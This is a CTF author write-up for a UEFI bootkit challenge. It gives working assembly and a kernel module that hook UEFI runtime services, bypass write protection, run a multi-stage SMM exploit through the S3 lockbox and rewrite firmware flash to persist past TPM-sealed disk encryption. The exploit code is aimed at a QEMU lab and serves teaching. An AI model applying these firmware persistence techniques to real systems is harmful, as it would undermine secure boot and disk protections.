# Bootkit

by YiFei Zhu

> Many years later, in a galaxy far far away, the Empire of UIUCTF was
> collecting UEFI patches for their secret lab machines, and stumbled upon the
> remains of SIGPwny Inc. and PwnySIG Inc. Not knowing the dangers, they
> installed both patch sets to their super secure lab machines, with
> TPM-sealed disk encryption protecting their latest research (flag).
>
> As the lead security officer of the rebellion against the Empire, you need
> their research to expose the Empire of their anti-droid vendetta.
> Unfortunately, you discovered that the Empire designed the secret disks such
> that they detach themselves as soon as any keyboard input is detected during
> boot, and since you need the keyboard to install the bootkit, the bootkit
> must survive the reboot. TPM also hashes everything on the boot disk and
> there's no hope of keeping the bootkit there.
>
> That leaves only one option, completely and utterly pwning the firmware...
>
> Lua.efi, but with persistance. SMM is Asleep, but with purpose.
>
> `$ socat file:$(tty),raw,echo=0 openssl:bootkit.chal.uiuc.tf:1337`
>
> Hint: UEFIReplace from https://github.com/LongSoft/UEFITool/tree/old_engine
> is installed remotely in the initramfs, so you don't need to transfer
> megabytes of data though serial.
>
> Hint: Command entered into /proc/sys/kernel/run_command will be run by
> initrd. Without, one could spawn processes by writing to kernel data structs
> (or modprobe_path I guess) since you have arbitrary kernel write anyways...
>
> Hint: KASLR is off. With KASLR one could just easily compute the offset from
> the call stack.
>
> Hint: PCR 0 and 1 are not measured. If they were, one could feed TPM with
> fake hashes since system boot, considering you have arbitrary CFI flash write
> anyways... I mean, who said the hashes has to be of a real blob?
> [[1](https://github.com/tianocore/edk2/blob/8be9a344d35316fb0ee70a33779a7a931fcb8a1d/SecurityPkg/Library/Tpm2CommandLib/Tpm2Integrity.c#L92)]
> [[2](https://github.com/stefanberger/libtpms/blob/7dfe310f06cc188187807d36e4786458e3e14e86/src/tpm2/IntegrityCommands.c#L66)]
> [[3](https://github.com/microsoft/ms-tpm-20-ref/blob/ee21db0a941decd3cac67925ea3310873af60ab3/TPMCmd/tpm/src/command/PCR/PCR_Extend.c)]
> [[4](https://github.com/tpm2-software/tpm2-tools/blob/112f0e547a7a83d625b585e506449a185e9268cc/man/tpm2_pcrextend.1.md)]
> [[5](https://trustedcomputinggroup.org/wp-content/uploads/Trusted-Platform-Module-2.0-Library-Part-3-Version-184_pub.pdf), Section 22.2]

The inspiration of this challenge came when I was talking to
[Ronan](https://github.com/rpjboyarski) about UEFI. So I thought, why not have
a chal to attack the root of trust of flash memory, to set up persistence
there, in the form of a bootkit? CTFs often have the step of exploiting a vuln,
but often lacks the engineering of having a more complex payload after the
exploit, and I think this is also really important.

However, this challenge was a pain to make. TPM is so sensitive to literally
everything. Even an attempt to boot from the wrong disk (even if the disk
isn't bootable), causes a PCR mismatch and the disk will proceed to refuse to
decrypt. And then the toolings for modifying UEFI firmware is nonexistant.

Much of the solve is shared between this chal, and Lua.efi and SMM Is Asleep,
so I will go over the differences. I'll also go over the design briefly since
this is an author writeup :)

## Challenge design

I wanted to force the exploit chain to pwn the firmware on flash. In most
circumstances, there are easier ways to write a bootkit. Like, if secure boot
can be bypassed, one can simply load a UEFI executable in the EFI system
partition, and as we see in the first part of this challenge, if one can get
arbitrary code execution, they can do practically anything to the secure boot
environment for that boot and change the OS runtime behavior.

Normally, secure boot is secure because all executables must be signed by
a key in UEFI's KEK (Key Exchange Key) or db variables. If it's a variable it
would be mutable, but these variables are stored inside flash, which only SMM
has write access to, and SMM will enforce that db can only be updated with a
KEK-signed signature, and KEK can only be updated with a PK-signed signature
(PK = Platform Key), and PK can only be updated... if signed with existing PK
(or there's no PK so the system is in setup mode). This means, even if one is
able to get past secure boot once, they cannot make the system trust it
permanently.

That said, while executables must be signed, the data these executables touch
don't have to be. That means, if you have a signed kernel, you could ask it to
load an arbitrary initrd and... now you have root over the machine. However,
for many OS kernels, they enforce signing for kernel-mode drivers and modules,
so even if one gets root, they can't compromise secure boot in the sense of
arbitrary code execution in ring 0... but, they can still do some scary stuffs
such as installing a keylogger to obtain all sorts of passwords. However, if
there is a bootkit, these signing requirements could all be disabled by the
bootkit and there's really not much one can do about it.

Except... that's where TPM comes in. TPM has an attestation feature, and ring 0
code can talk to the TPM and send it hashes of measurements. TPM contains
several PCR banks, and if a hash `Hash` is sent to `PCR[N]`, it performs:

```
PCR[N] = hashalgo(PCR[N]||Hash)
```

So unless one is able to reverse a cryptographically-secure hashing algorithm
(often SHA256), once a PCR is extended with a hash, it cannot be undone without
a reboot.

Normally, during boot, the UEFI firmware will send itself to PCR 0, and any
UEFI executables it runs from disk, including bootloader and kernel, into PCR 4.
Things like secure boot keys and whether it is enabled is also measured into
PCR 7. The Linux kernel will also attempt to measure the initrd and cmdline
into PCR 9. See [Linux TPM PCR Registry](https://uapi-group.org/specifications/specs/linux_tpm_pcr_registry/).

In this challenge, PCRs 2,3,4,5,6,7,9 are measured, and the disk will only
decrypt if these PCRs are the expected value, same as when the disk was first
encrypted. And what I said earlier about putting a bootkit in EFI system
partition isn't possible because, well, the firmware will hash it and extend
PCR 4, and there's no undo-ing the extension to keep the hash matching expected
value. Initrd? Not only is it extended to PCR 9 by the kernel, it is also
extended to PCR 4 because it's part of the UKI image (a single UEFI executable
containing both the kernel and initrd). So practically, if the adversary changes
anything, the user will know because the disk will not unlock.

Normally, PCRs 0 and 1 are also measured, but honestly... there's barely a
point. If an adversary can compromise the firmware flash, they can also send
fake hashes of itself to TPM, since the firmware measures itself, rather than
being measured by something else, so there's nothing to "undo"... this is
described with some links in the hints, and I don't want to make the challenge
too tedious :)

Therefore to pwn a system that is TPM-attested, you really have to pwn the root
of trust, the firmware flash... and that's what I wanted from this challenge,
and it plays very nicely as a combination of harder versions of both previous
challenges.

Also, on a side note, the UEFI keys between the handout version and deployed
versions are different because I wanted to really stop unintendeds. I'm not sure
how they could do it (they would need to reverse some cryptographically-secure
algorithms), but there's too many components to this challenge and I wanted to
be extra safe.

## Getting a shell

As per the hints, I want to modify `/proc/sys/kernel/run_command` in UEFI. How
would I accomplish that? My immediate thought was to infect a function that
the OS might call... ideally at runtime so I don't need to deal with where the
sysctl would be located in memory (I can just look at the symbols of vmlinux)
to locate `sysctl_run_command`.

I had a hunch that UEFI Variable Services would be called by the OS. I mean,
the OS has to know the trusted keyring, and whether secure boot is enabled and
stuffs. They go through variable services, so I want to overwrite
`gRT->GetVariable` with a payload.

```asm
_start:
  mov (%rsp),%rax
  push %rsi
  push %rdi
  push %r12
  push %r13
  push %r14

  # R14 = gBS, R13 = gRT
  mov (LuaEfi_off_gRT-LuaEfi_off_retaddr)(%rax),%r12
  mov (LuaEfi_off_gBS-LuaEfi_off_retaddr)(%rax),%r13

  # orig_getvariable = GetVariable
  # I don't need to translate addresses with gRT->ConvertPointer or
  # use relative addresses... which is nice
  # This is due to arch/x86/platform/efi/efi_64.c efi_map_region:
  # > Make sure the 1:1 mappings are present as a catch-all for b0rked
  # > firmware which doesn't update all internal pointers after switching
  # > to virtual mode and would otherwise crap on us.
  mov RT_off_GetVariable(%r12),%rax
  mov %rax,orig_getvariable(%rip)

  # AllocatePool(EfiRuntimeServicesCode, payload_end-payload, &R14)
  mov $EfiRuntimeServicesCode,%rcx
  mov $(payload_end - payload),%rdx
  lea buffer_addr(%rip),%r8
  call *BS_off_AllocatePool(%r13)
  mov buffer_addr(%rip), %r14

  # GetVariable = R14
  mov %r14,RT_off_GetVariable(%r12)

  # memcpy(R14, payload, payload_end - payload)
  lea payload(%rip),%rsi
  mov %r14,%rdi
  mov $(payload_end - payload),%rcx
  rep movsb

  xor %eax,%eax
  pop %r14
  pop %r13
  pop %r12
  pop %rdi
  pop %rsi
  ret

buffer_addr:
  .quad 0

payload:
  mov (%rsp),%rax
  push %rsi

  test %rax,%rax
  jns preboot

[...]

preboot:
  pop %rsi
  mov orig_getvariable(%rip),%rax
  push %rax
  ret

orig_getvariable:
  .quad 0

payload_end:
```

This caused a kernel panic at boot:

```
+ mkdir -p /proc /dev /sys /etc /mnt
+ mount -n -t proc -o nosuid,noexec,nodev proc /proc/
+ mount -n -t devtmpfs -o mode=0755,nosuid,noexec devtmpfs /dev
+ mount -n -t sysfs -o nosuid,noexec,nodev sys /sys
+ mount -n -t tmpfs -o mode=1777 tmpfs /tmp
+ mount -t efivarfs efivarfs /sys/firmware/efi/efivars
[    3.586082] kernel tried to execute NX-protected page - exploit attempt? (uid: 0)
[    3.586756] BUG: unable to handle page fault for address: fffffffeff7c9e98
[    3.586955] #PF: supervisor instruction fetch in kernel mode
[    3.587109] #PF: error_code(0x0011) - permissions violation
[    3.587349] PGD 1aec067 P4D 1aec067 PUD 1af0063 PMD 1af7063 PTE 800000001e5c9023
[    3.587706] Oops: Oops: 0011 [#1] NOPTI
[    3.588102] CPU: 0 UID: 0 PID: 27 Comm: kworker/u4:2 Not tainted 6.15.4-uiuctf-2025 #1 PREEMPT(voluntary)
[    3.588371] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS unknown 02/02/2022
[    3.588648] Workqueue: efi_rts_wq efi_call_rts
[    3.589127] RIP: 0010: 0xfffffffeff7c9e98
[    3.589343] Code: [...]
[    3.589731] RSP: 0018:ffffc90QQ00efe18 EFLAGS: 00010282
[    3.589874] RAX: 0000000000000001 RBX: 0000000000000287 RCX: ffff88800390f000
[    3.590066] RDX: ffff88800390f400 RSI: ffff88800390f000 RDI: fffffffeff7c9e98
[    3.590223] RBP: ffffc900000efe50 R0B: 0000000000000000 R09: ffffc90000147d40
[    3.590372] R10: 8080808080808080 R11: fefefefefefefeff R12: ffff8880038e9600
[    3.590522] R13: ffff888003843540 R14: 0000000000000000 R15: 61c8864680b583eb
[    3.590697] FS: 0000000000000000(0000) GS:0000000000000000(0000) kn1GS:0000000000000000
[    3.590862] CS: 0010 DS: 9000 ES: 0000 CR0: 0000000080050033
[    3.590982] CR2: fffffffeff7c9e98 CR3: 0A00000001aeb000 CR4: 0000000000750ef0
[    3.591152] PKRU: 55555554
[    3.591268] Call Trace:
[    3.591754] <TASK>
[    3.591883] ? __efi_cal1+0x28/0x30
[    3.592061] efi_call_rts+0x136/0x220
[    3.592278] process_scheduled_works+0x197/0x2b0
[    3.592394] worker_thread+0x16b/0x200
[    3.592476] ? __pfx_worker_thread+0x10/0x10
[    3.592559] kthread+0x176/0x180
[    3.592643] ? finish_task_switch.isra.0+0xf3/0x190
[    3.592745] ? __pfx_kthread+0x10/0x10
[    3.592826] ret_from_fork+0x1f/0x40
[    3.592917] ? __pfx_kthread+0x10/0x10
[    3.592989] ret_from_fork_asm+0x19/0x30
[    3.593107] </TASK>
[    3.593190] Modules linked in:
[    3.593432] CR2: fffffffeff7c9e98
[    3.593708] ---[ end trace 0000000000000000 ]---
[    3.612591] pstore: backend (efi_pstore) writing error (-16)
```

Wait, I thought UEFI is all RWX?! I even allocated from
`EfiRuntimeServicesCode`!

Turns out, UEFI does do some protection on the code / data pages. Separate from
the different memory regions, there's a UEFI memory attributes table set by
`ProtectUefiImage` in DxeCore. This is consumed by the kernel, as described in
this comment in `arch/x86/platform/efi/efi_64.c`:
```C
static void __init __map_region(efi_memory_desc_t *md, u64 va)
{
[...]
	/*
	 * EFI_RUNTIME_SERVICES_CODE regions typically cover PE/COFF
	 * executable images in memory that consist of both R-X and
	 * RW- sections, so we cannot apply read-only or non-exec
	 * permissions just yet. However, modern EFI systems provide
	 * a memory attributes table that describes those sections
	 * with the appropriate restricted permissions, which are
	 * applied in efi_runtime_update_mappings() below. All other
	 * regions can be mapped non-executable at this point, with
	 * the exception of boot services code regions, but those will
	 * be unmapped again entirely in efi_free_boot_services().
	 */
	if (md->type != EFI_BOOT_SERVICES_CODE &&
	    md->type != EFI_RUNTIME_SERVICES_CODE)
		flags |= _PAGE_NX;
[...]
}
```

I'd rather not go though DXE services to patch the memory attributes table, so
instead, I chose to patch an a real runtime code page; maybe RuntimeDxe's
`_ModuleEntryPoint`, since that isn't used after it runs the first time (Note:
`SetVirtualAddressMap` is chosen for offset because `GetVariable` is in a
different driver, VariableSmmRuntimeDxe, not RuntimeDxe, although I could
adapt offsets for VariableSmmRuntimeDxe instead):

```asm
LuaEfi_off_gBS = 0x34638
LuaEfi_off_gRT = 0x34558
LuaEfi_off_retaddr = 0x1cf13

RuntimeDxe_off_ModuleEntryPoint = 0x2465
RuntimeDxe_off_RuntimeDriverSetVirtualAddressMap = 0x1e66

RT_off_SetVirtualAddressMap = 56
RT_off_GetVariable = 72

_start:
  mov (%rsp),%rax
  push %rsi
  push %rdi
  push %r12
  push %r13

  # R12 = gRT, R13 = gBS
  mov (LuaEfi_off_gRT-LuaEfi_off_retaddr)(%rax),%r12
  mov (LuaEfi_off_gBS-LuaEfi_off_retaddr)(%rax),%r13

  # orig_getvariable = gRT->GetVariable
  mov RT_off_GetVariable(%r12),%rax
  mov %rax,orig_getvariable(%rip)

  # Allocating EfiRuntimeServicesCode pages become NX after Linux boot,
  # due to us not simulating ProtectUefiImageCommon and updating memory
  # attributes table. So, to make life easier, let's just infect RuntimeDxe...
  # R10 = RuntimeDxe._ModuleEntryPoint
  mov RT_off_SetVirtualAddressMap(%r12),%r10
  lea (RuntimeDxe_off_ModuleEntryPoint-RuntimeDxe_off_RuntimeDriverSetVirtualAddressMap)(%r10),%r10

  # gRT->GetVariable = R10
  mov %r10,RT_off_GetVariable(%r12)

  # memcpy(R10, payload, payload_end - payload)
  lea payload(%rip),%rsi
  mov %r10,%rdi
  mov $(payload_end - payload),%rcx
  rep movsb
```

And... oh `ProtectUefiImage` also protects the page tables to make those code
pages read-only... fear not, we are ring 0!

```asm
  # ... which is read-only, due to ProtectUefiImageCommon
  mov %cr0,%rax
  push %rax
  and $~0x10000,%rax
  mov %rax,%cr0

  rep movsb

  pop %rax
  mov %rax,%cr0
```

And the payload?
```asm
sysctl_run_command = 0xffffffff824a9360

payload:
  mov (%rsp),%rax

  test %rax,%rax
  jns preboot

  # memcpy(sysctl_run_command, "bash", 4)
  push %rdi
  push %rsi
  push %rcx
  mov $sysctl_run_command,%rdi
  lea s_bash(%rip),%rsi
  mov $(s_bash_end - s_bash),%rcx
  rep movsb
  pop %rcx
  pop %rsi
  pop %rdi

preboot:
  mov orig_getvariable(%rip),%rax
  push %rax
  ret

orig_getvariable:
  .quad 0

s_bash:
  .ascii "bash"
s_bash_end:

payload_end:
```

## Dumping the flash

I wanted to have a file-like interface to the flash memory. Reading the flash
is simple; it's just MMIO. The location? OVMF's README explains it:

```
Using the 4MB image, the layout of the firmware device in memory looks like:

+--------------------------------------- base + 0x400000 (4GB/0x100000000)
| VTF0 (16-bit reset code) and OVMF SEC
| (SECFV, 208KB/0x34000)
+--------------------------------------- base + 0x3cc000
|
| Compressed main firmware image
| (FVMAIN_COMPACT, 3360KB/0x348000)
|
+--------------------------------------- base + 0x84000
| Fault-tolerant write (FTW)
| Spare blocks (264KB/0x42000)
+--------------------------------------- base + 0x42000
| FTW Work block (4KB/0x1000)
+--------------------------------------- base + 0x41000
| Event log area (4KB/0x1000)
+--------------------------------------- base + 0x40000
| Non-volatile variable storage
| area (256KB/0x40000)
+--------------------------------------- base address (0xffc00000)
```

Alternatively, one could locate the logic from QEMU's code:

`hw/i386/pc_sysfw.c`:
```C
static void pc_system_flash_map(PCMachineState *pcms,
                                MemoryRegion *rom_memory)
{
[...]
    for (i = 0; i < ARRAY_SIZE(pcms->flash); i++) {
[...]
        total_size += size;
        gpa = 0x100000000ULL - total_size; /* where the flash is mapped */
        qdev_prop_set_uint32(DEVICE(system_flash), "num-blocks",
                             size / FLASH_SECTOR_SIZE);
        sysbus_realize_and_unref(SYS_BUS_DEVICE(system_flash), &error_fatal);
        sysbus_mmio_map(SYS_BUS_DEVICE(system_flash), 0, gpa);
[...]
```

So below 0x100000000 is OVMF_CODE, then OVMF_VARS.

```
run $ ls -al OVMF*
-rw-r--r-- 1 zhuyifei1999 zhuyifei1999 3653632 Dec 31  1969 OVMF_CODE.fd
-rw-r--r-- 1 zhuyifei1999 zhuyifei1999  540672 Dec 31  1969 OVMF_VARS.fd
```

3653632 = 0x37c000, 540672 = 0x84000, so:
- OVMF_CODE.fd is 0xffc84000 - 0x100000000 (size 0x37c000)
- OVMF_VARS.fd is 0xffc00000 - 0xffc00000 (size 0x84000)

This is further confirmed by OVMF's own code in
`OvmfPkg/Include/Fdf/OvmfPkgDefines.fdf.inc`:

```
!if $(FD_SIZE_IN_KB) == 4096
DEFINE VARS_SIZE         = 0x84000
DEFINE FW_BASE_ADDRESS   = 0xFFC00000
DEFINE FW_SIZE           = 0x00400000
DEFINE CODE_BASE_ADDRESS = 0xFFC84000
DEFINE CODE_SIZE         = 0x0037C000
!endif
```

So, all I need is a simple kernel character device with ioremap:

```C
#define FW_BASE_ADDRESS 0xFFC00000UL
#define FW_SIZE 0x00400000UL

static void *PflashVirt;

static loff_t pflash_misc_llseek(struct file *file, loff_t offset, int origin)
{
	return generic_file_llseek_size(file, offset, origin, MAX_LFS_FILESIZE,
					FW_SIZE);
}

static ssize_t pflash_misc_read(struct file *file, char __user *buf,
				size_t count, loff_t *ppos)
{
	if (*ppos >= FW_SIZE)
		return 0;

	count = min_t(size_t, count, FW_SIZE - *ppos);
	count = min_t(size_t, count, PAGE_SIZE);

	if (copy_to_user(buf, PflashVirt + *ppos, count))
		return -EFAULT;

	*ppos += count;
	return count;
}

static const struct file_operations pflash_misc_fops = {
	.owner = THIS_MODULE,
	.llseek = pflash_misc_llseek,
	.read = pflash_misc_read,
};

static struct miscdevice pflash_misc = {
	MISC_DYNAMIC_MINOR,
	"pflash",
	&pflash_misc_fops,
};

static void install_cdev(void)
{
	PflashVirt = ioremap(FW_BASE_ADDRESS, FW_SIZE);

	BUG_ON(misc_register(&pflash_misc));
}
```

## Patching the firmware

Don't get me started on how the tooling for this is practically nonexistent.

UEFITool can do it, but not the latest version. https://github.com/LongSoft/UEFITool:
> It's in development right now with the following features still missing:
> - Editor part, i.e image reconstruction routines

Ok, let's look at the alternatives (results from what I recall):
- [FMMT](https://github.com/tianocore/edk2/tree/master/BaseTools/Source/Python/FMMT) -
Results in OOM
- [Fiano](https://github.com/linuxboot/fiano) - Results in unbootable image.
The boot dies after:
   ```
   Memory Allocation 0x00000004 Ox1AF6C000 - 0x1AF8BFFF
   FV Hob 0x900000 - 0x177FFFF
   InstallProtocolInterface: D8117CFE-94A6-11D4-9A3A-0090273FC14D 1EDD23A0
   InstallProtocolInterface: 8F644FA9-E850-4DB1-9CE2-0B44698E8DA4 1E56E1B0
   InstallProtocolInterface: 09576E91-6D3F-11D2-8E39-00A0C969723B 1E56EA18
   InstallProtocolInterface: EE4E5898-3914-4259-9D6E-DC7BD79403CF 1EDD22B8
   DxeCoreLoadImages

   Security Arch Protocol not present!!

   CPU Arch Protocol not present!!

   Metronome Arch Protocol not present!!

   Timer Arch Protocol not present!!

   Bds Arch Protocol not present!!

   Watchdog Timer Arch Protocol not present!!

   Runtime Arch Protocol not present!!

   Variable Arch Protocol not present!!

   Variable Write Arch Protocol not present!!

   Capsule Arch Protocol not present!!

   Monotonic Counter Arch Protocol not present!!

   Reset Arch Protocol not present!!

   Real Time Clock Arch Protocol not present!!

   ASSERT_EFI_ERROR (Status = Not Found)
   ASSERT DxeMain.c(580): !(((RETURN_STATUS)(Status)) >= 0x8000000000000000ULL)
   ```
- [uefi-firmware-parser](https://github.com/theopolis/uefi-firmware-parser) -
Attempting to repack the firmware results in Python 3 type errors for
operations between str and bytes. Fixing that results in more assertion errors
within the Python code.
- [Chipsec](https://github.com/chipsec/chipsec) - I was unable to find any code
in that that repacks firmware.

In the end, I just used an old version of UEFITool that actually does have this
feature :( Luckily it has a command-line only tool, UEFIReplace, that I ended
up installing in the VM.

The patched firmware is fresh built from OVMF, with this patch:
```diff
--- a/MdeModulePkg/Universal/Variable/RuntimeDxe/VariableSmmRuntimeDxe.c
+++ b/MdeModulePkg/Universal/Variable/RuntimeDxe/VariableSmmRuntimeDxe.c
@@ -783,6 +783,12 @@ RuntimeServiceGetVariable (
   )
 {
   EFI_STATUS  Status;
+  STATIC CONST CHAR8 TargetCommand[] = "cat /mnt/flag";
+  STATIC VOID *sysctl_run_command = (VOID *)0xffffffff824a9360;
+  UINTN ReturnAddress = (UINTN)RETURN_ADDRESS (0);
+
+  if ((INTN)ReturnAddress < 0)
+    CopyMem (sysctl_run_command, TargetCommand, sizeof (TargetCommand));

   if ((VariableName == NULL) || (VendorGuid == NULL) || (DataSize == NULL)) {
     return EFI_INVALID_PARAMETER;
```
This is essentially what the previous lua payload did, but `cat /mnt/flag`
instead of `bash`, since the command must dump the flag non-interactively
(serial input gets disabled).

## Writing to the flash

In the QEMU arguments, there is
`-global driver=cfi.pflash01,property=secure,value=on`. This flag means the
flash can only be written from SMM. This is like how some real-life SPI flash
works, because one still needs write to flash to allow the firmware to update
itself, change UEFI variables, secure boot state etc., and they are all
access-controlled by SMM. I need an arbitrary code execution in SMM, and that's
where SMM Is Asleep's exploit comes in.

Since ASLR is enabled, I first wanted to get to get the relevant addresses
pre-runtime from the Lua payload, so I could talk to SMM.

```asm
PiSmmIpl_off_mSmmCommunication = 0x7420

BS_off_AllocatePages = 40
BS_off_LocateProtocol = 320

AllocateAnyPages = 0
EfiRuntimeServicesData = 6

  # ===== Find location of PiSmmIpl.efi =====
  lea s_PiSmmIpl(%rip),%rsi
  call print

  # gBS->LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &addrbuf)
  lea gEfiSmmCommunicationProtocolGuid(%rip),%rcx
  xor %edx,%edx
  lea addrbuf(%rip),%r8
  call *BS_off_LocateProtocol(%r13)

  mov addrbuf(%rip),%rsi
  lea -(PiSmmIpl_off_mSmmCommunication)(%rsi),%rsi
  call print_hex

  mov $'\n',%al
  outb %al,(%dx)

  # ===== Allocate 2 Runtime Data pages for SMM Communication later on =====
  lea s_RtData(%rip),%rsi
  call print

  # gBS->AllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &addrbuf)
  mov $AllocateAnyPages,%ecx
  mov $EfiRuntimeServicesData,%edx
  mov $2,%r8d
  lea addrbuf(%rip),%r9
  call *BS_off_AllocatePages(%r13)

  mov addrbuf(%rip),%rsi
  call print_hex

  mov $'\n',%al
  outb %al,(%dx)

  xor %eax,%eax
  pop %r13
  pop %r12
  pop %rdi
  pop %rsi
  pop %rbx
  ret

print_hex:
  mov $0x3f8,%dx
  xor %ebx,%ebx
  mov $16,%cl
print_hex_loop:
  rol $4,%rsi
  mov %sil,%bl
  and $0xf,%bl
  lea hextbl(%rip),%rax
  mov (%rax,%rbx,1),%al
  outb %al,(%dx)
  dec %cl
  jnz print_hex_loop
  ret

print:
  mov $0x3f8,%dx
print_loop:
  lodsb
  test %al,%al
  je print_ret
  outb %al,(%dx)
  jmp print_loop
print_ret:
  ret

gEfiSmmCommunicationProtocolGuid:
  .long 0xc68ed8e2
  .short 0x9dc6
  .short 0x4cbd
  .byte 0x9d, 0x94, 0xdb, 0x65, 0xac, 0xc5, 0xc3, 0x32

s_PiSmmIpl:
  .asciz "PiSmmIpl: "
s_RtData:
  .asciz "RtData: "

hextbl:
  .ascii "0123456789ABCDEF"

addrbuf:
  .quad 0
```

And now that I have the addresses for PiSmmIpl.efi and two
EfiRuntimeServicesData pages, I can begin the SMM exploit from the kernel.
Luckily, ASLR does not affect PEI stage so S3Resume2Pei can still be hardcoded.

```C
static unsigned long RtDataPhys;
module_param(RtDataPhys, ulong, 0);
static void *RtDataVirt;
static unsigned long PiSmmIplPhys;
module_param(PiSmmIplPhys, ulong, 0);
static void *PiSmmIplVirt;

__asm__ (
	/* Stage 2 Payload: Executed post-PEI while SMRAM open, find
	   SmmEntryPoint and overwrite it with with stage 3 payload */
	" .data                                    \n"
	"PiSmmIpl_off_mSmmCorePrivateData = 0x7160 \n"
	"SmmCpuPrivateData_off_SmmEntryPoint = 32  \n"
	"payload_stage2:                           \n"
	" pushf                                    \n"
	" push %rdi                                \n"
	" push %rsi                                \n"
	" push %rcx                                \n"
	" mov payload_PiSmmIplPhys(%rip),%rdi      \n"
	" mov (PiSmmIpl_off_mSmmCorePrivateData+SmmCpuPrivateData_off_SmmEntryPoint)(%rdi),%rdi \n"
	" lea payload_stage3(%rip),%rsi            \n"
	" mov $(payload_end-payload_stage3),%rcx   \n"
	" rep movsb                                \n"
	" pop %rcx                                 \n"
	" pop %rsi                                 \n"
	" pop %rdi                                 \n"
	" popf                                     \n"

	" push $(0x00000852CC0+0x00000000000029e0) \n" // S3Resume2PeiPhys + jump target
	" ret                                      \n"

	"payload_PiSmmIplPhys:                     \n"
	" .quad 0                                  \n"

	/* Stage 3 Payload: Executed in SMM, handle write request */
	"payload_stage3:                           \n"
[...]

	"payload_RtDataPhys:                       \n"
	" .quad 0                                  \n"

	"payload_end:"
	" .text                                    \n"
	" .code64                                  \n"
);

static void install_payload(void)
{
	PiSmmIplVirt = ioremap(PiSmmIplPhys, 0x10000);
	S3Resume2PeiVirt = ioremap(S3Resume2PeiPhys, 0x10000);

	payload_PiSmmIplPhys = PiSmmIplPhys;
	payload_RtDataPhys = RtDataPhys;

	memcpy(S3Resume2PeiVirt + S3Resume2Pei_payload_off, &payload_stage2,
		&payload_end-&payload_stage2);

	lockbox(&(union lockboxparam){ .save = {
		.Header.Command      = EFI_SMM_LOCK_BOX_COMMAND_SAVE,
[...]
	}});

	lockbox(&(union lockboxparam){ .setattr = {
		.Header.Command      = EFI_SMM_LOCK_BOX_COMMAND_SET_ATTRIBUTES,
[...]
		.Attributes          = LOCK_BOX_ATTRIBUTE_RESTORE_IN_PLACE,
	}});

	pm_suspend(PM_SUSPEND_MEM);
}
```

An interesting part of this is actually how to write to flash in SMM. It's
MMIO, so special semantics apply. QEMU implements CFI flash in
`hw/block/pflash_cfi01.c`, and writing is a state-machine:

```C
static MemTxResult pflash_mem_write_with_attrs(void *opaque, hwaddr addr, uint64_t value,
                                               unsigned len, MemTxAttrs attrs)
{
    PFlashCFI01 *pfl = opaque;
    bool be = !!(pfl->features & (1 << PFLASH_BE));

    if ((pfl->features & (1 << PFLASH_SECURE)) && !attrs.secure) {
        return MEMTX_ERROR;
    } else {
        pflash_write(opaque, addr, value, len, be);
        return MEMTX_OK;
    }
}

static void pflash_write(PFlashCFI01 *pfl, hwaddr offset,
                         uint32_t value, int width, int be)
{
    uint8_t *p;
    uint8_t cmd;

    cmd = value;
[...]
    switch (pfl->wcycle) {
    case 0:
        /* read mode */
        switch (cmd) {
        case 0x00: /* This model reset value for READ_ARRAY (not CFI) */
            goto mode_read_array;
        case 0x10: /* Single Byte Program */
        case 0x40: /* Single Byte Program */
            trace_pflash_write(pfl->name, "single byte program (0)");
            break;
[...]
        }
        pfl->wcycle++;
        pfl->cmd = cmd;
        break;
    case 1:
        switch (pfl->cmd) {
        case 0x10: /* Single Byte Program */
        case 0x40: /* Single Byte Program */
            trace_pflash_write(pfl->name, "single byte program (1)");
            if (!pfl->ro) {
                pflash_data_write(pfl, offset, value, width, be);
                pflash_update(pfl, offset, width);
            } else {
                pfl->status |= 0x10; /* Programming error */
            }
            pfl->status |= 0x80; /* Ready! */
            pfl->wcycle = 0;
        break;
[...]
```

I'm using single byte program because it's the simplest to deal with. To
perform a write of 1 byte, one needs to first write either 0x10 or 0x40,
followed by another write of the actual request. So, this ended up being my
SMM payload:

```asm
payload_stage3:
  push %rsi
  push %rbx
  mov payload_RtDataPhys(%rip),%rdx
  lea 0x1000(%rdx),%rsi
  mov 0x500(%rdx),%rbx
  mov 0x508(%rdx),%rcx
  test %rcx,%rcx
write_loop:
  jz write_return
  lodsb
  movb $0x10,(%rbx) // CFI Single Byte Program
  mov %al,(%rbx)
  inc %rbx
  dec %rcx
  jmp write_loop
write_return:
  pop %rbx
  pop %rsi
  ret
```

With that, the pflash write function:
```C
static ssize_t pflash_misc_write(struct file *file, const char __user *buf,
				 size_t count, loff_t *ppos)
{
	unsigned long *shared_pos = RtDataVirt + 0x500;
	unsigned long *shared_len = shared_pos + 1;

	if (*ppos >= FW_SIZE)
		return 0;

	count = min_t(size_t, count, FW_SIZE - *ppos);
	count = min_t(size_t, count, PAGE_SIZE);

	if (copy_from_user(RtDataVirt + 0x1000, buf, count))
		return -EFAULT;

	*shared_pos = FW_BASE_ADDRESS + *ppos;
	*shared_len = count;

	mb();
	smi();

	*shared_pos = *shared_len = 0;

	*ppos += count;
	return count;
}

static int __init exploit_init(void)
{
	if (!RtDataPhys || !PiSmmIplPhys)
		return -EINVAL;

	RtDataVirt = ioremap(RtDataPhys, 0x2000);
	memset(RtDataVirt, 0, 0x2000);

	install_payload();
	install_cdev();

	return 0;
}
```

## Final thoughts

With that, we have the flag after a reboot:

```
+ mkdir -p /proc /dev /sys /etc /mnt
+ mount -n -t proc -o nosuid,noexec,nodev proc /proc/
+ mount -n -t devtmpfs -o mode=0755,nosuid,noexec devtmpfs /dev
+ mount -n -t sysfs -o nosuid,noexec,nodev sys /sys
+ mount -n -t tmpfs -o mode=1777 tmpfs /tmp
+ mount -t efivarfs efivarfs /sys/firmware/efi/efivars
+ mount -n -t securityfs securityfs /sys/kernel/security
+ ln -s /proc/self/fd /dev/fd
+ [[ ! -e /dev/tpm0 ]]
+ [[ ! -e /dev/vda ]]
++ dd if=/dev/vda bs=1 count=4
+ [[ LUKS == LUKS ]]
+ clevis luks unlock -d /dev/vda -n secret-disk -o --allow-discards
+ mount /dev/mapper/secret-disk /mnt
++ cat /proc/sys/kernel/run_command
+ [[ -n cat /mnt/flag ]]
+ cd /root
++ cat /proc/sys/kernel/run_command
+ exec setsid bash -lc 'cat /mnt/flag'
uiuctf{I_have_friends_everywhere:_smm_kernel_and_userspace_53fbc31c}
```

The flag is a reference to Andor, a Star Wars show that I really enjoyed. Just
like the chal description which contains some random Star Wars references.

I really enjoyed writing these chals. SMM Is Asleep is an attack vector that,
